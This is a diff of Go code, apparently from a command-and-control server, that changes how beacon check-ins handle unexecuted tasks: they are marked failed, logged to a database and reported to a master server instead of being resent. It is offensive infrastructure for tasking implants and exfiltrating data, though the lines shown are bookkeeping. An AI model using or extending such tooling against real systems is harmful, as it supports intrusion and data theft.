@@ -1093,12 +1093,42 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 					}
 				}
 
-				// Task still active - resend it (idempotent)
-				taskResponse := fmt.Sprintf("TASK|%s|%s", task.ID, task.Command)
-				if c2.debug && !isDuplicate {
-					logf("[DEBUG] Re-sending current task %s to %s (status: %s)", task.ID, beaconID, task.Status)
+				// Task was sent but beacon checked in without starting exfiltration
+				// This means the beacon either didn't receive it or couldn't execute it
+				// Mark as failed instead of resending
+				c2.mutex.Lock()
+				if storedTask, exists := c2.tasks[task.ID]; exists {
+					if storedTask.Status == "sent" && storedTask.SentAt != nil {
+						// Beacon checked in but didn't start task - mark as failed
+						storedTask.Status = "failed"
+						storedTask.Result = "Task failed: Beacon checked in without starting execution"
+						beacon.CurrentTask = "" // Clear so next task can be delivered
+						logf("[C2] Task %s marked as FAILED for beacon %s (sent but not executed)", task.ID, beaconID)
+
+						// Update in database
+						if c2.db != nil {
+							go func(tid, result string) {
+								if err := c2.db.UpdateTaskStatus(tid, "failed"); err != nil && c2.debug {
+									logf("[C2] Failed to update task status in database: %v", err)
+								}
+								if err := c2.db.SaveTaskResult(tid, beaconID, result, 1, 1); err != nil && c2.debug {
+									logf("[C2] Failed to save task result in database: %v", err)
+								}
+							}(task.ID, storedTask.Result)
+						}
+
+						// Notify Master
+						if masterClient != nil {
+							go func(tid, bid, result string) {
+								if _, err := masterClient.SubmitResult(tid, bid, 1, 1, result); err != nil && c2.debug {
+									logf("[C2] Failed to notify Master of task failure: %v", err)
+								}
+							}(task.ID, beaconID, storedTask.Result)
+						}
+					}
 				}
-				return taskResponse
+				c2.mutex.Unlock()
+				return "ACK" // Task failed, move on
 			}
 		} else {
 			// Task doesn't exist anymore, clear it
@@ -1121,18 +1151,36 @@ func (c2 *C2Manager) handleCheckin(parts []string, clientIP string, isDuplicate 
 				c2.mutex.Unlock()
 				return "ACK" // No task to deliver
 			} else if storedTask.Status == "sent" {
-				// Task already sent - check if it's been too long (>2 min) and might need resend
-				if storedTask.SentAt != nil && time.Since(*storedTask.SentAt) < 2*time.Minute {
-					// Recently sent, don't re-send yet
-					beacon.TaskQueue = beacon.TaskQueue[1:]
-					if c2.debug {
-						logf("[DEBUG] Skipping recently-sent task %s (sent %v ago) from queue for beacon %s",
-							task.ID, time.Since(*storedTask.SentAt), beaconID)
-					}
-					c2.mutex.Unlock()
-					return "ACK"
+				// Task already sent but beacon checked in without starting it
+				// Mark as failed and remove from queue
+				beacon.TaskQueue = beacon.TaskQueue[1:]
+				storedTask.Status = "failed"
+				storedTask.Result = "Task failed: Sent but not executed by beacon"
+				logf("[C2] Task %s marked as FAILED for beacon %s (sent but beacon didn't execute)", task.ID, beaconID)
+
+				// Update in database
+				if c2.db != nil {
+					go func(tid, bid, result string) {
+						if err := c2.db.UpdateTaskStatus(tid, "failed"); err != nil && c2.debug {
+							logf("[C2] Failed to update task status in database: %v", err)
+						}
+						if err := c2.db.SaveTaskResult(tid, bid, result, 1, 1); err != nil && c2.debug {
+							logf("[C2] Failed to save task result in database: %v", err)
+						}
+					}(task.ID, beaconID, storedTask.Result)
 				}
-				// Old sent task, allow re-send (might have been lost)
+
+				// Notify Master
+				if masterClient != nil {
+					go func(tid, bid, result string) {
+						if _, err := masterClient.SubmitResult(tid, bid, 1, 1, result); err != nil && c2.debug {
+							logf("[C2] Failed to notify Master of task failure: %v", err)
+						}
+					}(task.ID, beaconID, storedTask.Result)
+				}
+
+				c2.mutex.Unlock()
+				return "ACK" // Task failed, check for next task
 			} else if storedTask.Status == "exfiltrating" {
 				// Task being exfiltrated - remove from queue and don't re-send
 				beacon.TaskQueue = beacon.TaskQueue[1:]
